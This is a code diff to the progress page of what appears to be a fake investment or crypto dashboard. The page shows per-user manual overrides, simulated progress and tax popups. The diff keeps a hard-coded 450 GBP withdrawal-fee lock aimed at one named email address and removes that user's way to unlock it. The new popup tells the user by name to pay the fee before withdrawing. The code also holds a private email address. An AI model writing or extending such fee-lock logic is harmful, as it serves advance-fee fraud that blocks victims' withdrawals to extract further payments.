@@ -133,8 +133,6 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
 const WITHDRAWAL_FEE_LOCK_BY_EMAIL: Record<string, { amount: number; currency: "GBP" | "USD" }> = {
   "tzahielk@gmail.com": { amount: 450, currency: "GBP" }
 };
-const WITHDRAWAL_FEE_OK_UNLOCK_EMAILS = new Set(["tzahielk@gmail.com"]);
-const RESET_DASHBOARD_ON_FINISH_EMAILS = new Set(["tzahielk@gmail.com"]);
 async function getJson<T>(path: string): Promise<T> {
   const res = await fetch(apiUrl(path), {
     method: "GET",
@@ -699,7 +697,6 @@ export default function ProgressPage() {
   const [taxPopup, setTaxPopup] = useState<string | null>(null);
   const [taxClearedPopup, setTaxClearedPopup] = useState<string | null>(null);
   const [withdrawSuccessPopup, setWithdrawSuccessPopup] = useState<string | null>(null);
-  const [withdrawFeeUnlockedByOk, setWithdrawFeeUnlockedByOk] = useState(false);
   const [withdrawals, setWithdrawals] = useState<WithdrawalItem[]>([]);
   const [taxPayments, setTaxPayments] = useState<TaxPaymentItem[]>([]);
   const [taxSummary, setTaxSummary] = useState<TaxSummary | null>(null);
@@ -741,16 +738,6 @@ export default function ProgressPage() {
       localStorage.setItem(key, JSON.stringify(alertCfg));
     } catch {}
   }, [alertCfg, user, plan]);
-
-  useEffect(() => {
-    if (!user) return;
-    const key = `withdraw_fee_unlock_by_ok:${user.id}`;
-    try {
-      setWithdrawFeeUnlockedByOk(localStorage.getItem(key) === "1");
-    } catch {
-      setWithdrawFeeUnlockedByOk(false);
-    }
-  }, [user]);
 
   useEffect(() => {
     if (!user || !plan) return;
@@ -1024,9 +1011,7 @@ export default function ProgressPage() {
   const secsLeft = simMeta.remainingSec % 60;
   const userEmailLower = String(user.email || "").toLowerCase();
   const manualOverride = MANUAL_PROGRESS_OVERRIDES[userEmailLower] || null;
-  const withdrawFeeLockRaw = WITHDRAWAL_FEE_LOCK_BY_EMAIL[userEmailLower] || null;
-  const canUnlockFeeByOk = WITHDRAWAL_FEE_OK_UNLOCK_EMAILS.has(userEmailLower);
-  const withdrawFeeLock = withdrawFeeLockRaw && !(canUnlockFeeByOk && withdrawFeeUnlockedByOk) ? withdrawFeeLockRaw : null;
+  const withdrawFeeLock = WITHDRAWAL_FEE_LOCK_BY_EMAIL[userEmailLower] || null;
   const useManualTaxOverride = !!manualOverride && (!adminTaxCleared || manualOverride.lockTaxDisplay === true);
   const displayUnit: "USD" | "GBP" | "BTC" = (manualOverride?.currency || plan.unit) as "USD" | "GBP" | "BTC";
   const isBtcUnit = displayUnit === "BTC";
@@ -1107,10 +1092,8 @@ export default function ProgressPage() {
       ? Number(taxSummary.tax_remaining)
       : Math.max(0, baseTaxDue - baseTaxPaid);
   const hasLockedWithdrawalForPlan = withdrawnLocked > 0.00000001;
-  const resetOnFinishEnabled = RESET_DASHBOARD_ON_FINISH_EMAILS.has(userEmailLower);
   const shouldResetDashboard =
-    (resetOnFinishEnabled && reachedTarget) ||
-    (taxRemaining <= 0.00000001 && (hasConfirmedWithdrawalForPlan || hasLockedWithdrawalForPlanRaw || hasLockedWithdrawalForPlan));
+    taxRemaining <= 0.00000001 && (hasConfirmedWithdrawalForPlan || hasLockedWithdrawalForPlanRaw || hasLockedWithdrawalForPlan);
   const progressPct = shouldResetDashboard ? 0 : baseProgressPct;
   const taxRate = shouldResetDashboard ? 0 : baseTaxRate;
   const taxDue = shouldResetDashboard ? 0 : baseTaxDue;
@@ -1190,7 +1173,8 @@ export default function ProgressPage() {
       return;
     }
     if (withdrawFeeLock) {
-      setTaxPopup("Cleared withdrawal fee. Press OK to withdraw.");
+      const feeLabel = fmtMoney(withdrawFeeLock.amount, withdrawFeeLock.currency);
+      setTaxPopup(`${userFirstName}, clear withdrawal fee of ${feeLabel} before submitting your withdrawal request.`);
       return;
     }
     const amt = lockedWithdrawalAmount;
@@ -1234,15 +1218,10 @@ export default function ProgressPage() {
       const j = await res.json().catch(() => ({}));
       if (!res.ok) throw new Error(j?.error || `HTTP ${res.status}`);
 
-      const isFastWalletNoticeUser = WITHDRAWAL_FEE_OK_UNLOCK_EMAILS.has(userEmailLower);
-      const successText = isFastWalletNoticeUser
-        ? "Withdrawal request submitted. It is now processing."
-        : "Withdrawal request submitted successfully. Please wait for admin approval.";
-      const successPopupText = isFastWalletNoticeUser
-        ? `${userFirstName}, your withdrawal is processing and will be available in your wallet after a couple of minutes.`
-        : `${userFirstName}, congratulations. Your withdrawal request was submitted successfully. Please wait for admin approval.`;
-      setWdMsg({ tone: "ok", text: successText });
-      setWithdrawSuccessPopup(successPopupText);
+      setWdMsg({ tone: "ok", text: "Withdrawal request submitted successfully. Please wait for admin approval." });
+      setWithdrawSuccessPopup(
+        `${userFirstName}, congratulations. Your withdrawal request was submitted successfully. Please wait for admin approval.`
+      );
       setWdNote("");
       setWdDestination("");
       const created = j?.request as WithdrawalItem | undefined;
@@ -1397,7 +1376,8 @@ export default function ProgressPage() {
                 onClick={() => {
                   if (!reachedTarget) return;
                   if (withdrawFeeLock) {
-                    setTaxPopup("Cleared withdrawal fee. Press OK to withdraw.");
+                    const feeLabel = fmtMoney(withdrawFeeLock.amount, withdrawFeeLock.currency);
+                    setTaxPopup(`${userFirstName}, clear withdrawal fee of ${feeLabel} before submitting your withdrawal request.`);
                     return;
                   }
                   setWithdrawOpen(true);
@@ -1766,17 +1746,7 @@ export default function ProgressPage() {
               <button
                 type="button"
                 className="primary"
-                onClick={() => {
-                  if (withdrawFeeLockRaw && canUnlockFeeByOk) {
-                    const key = `withdraw_fee_unlock_by_ok:${user.id}`;
-                    try {
-                      localStorage.setItem(key, "1");
-                    } catch {}
-                    setWithdrawFeeUnlockedByOk(true);
-                    setTaxClearedPopup("You are now eligible for your withdrawal. Tax status is fully cleared.");
-                  }
-                  setTaxPopup(null);
-                }}
+                onClick={() => setTaxPopup(null)}
               >
                 OK
               </button>
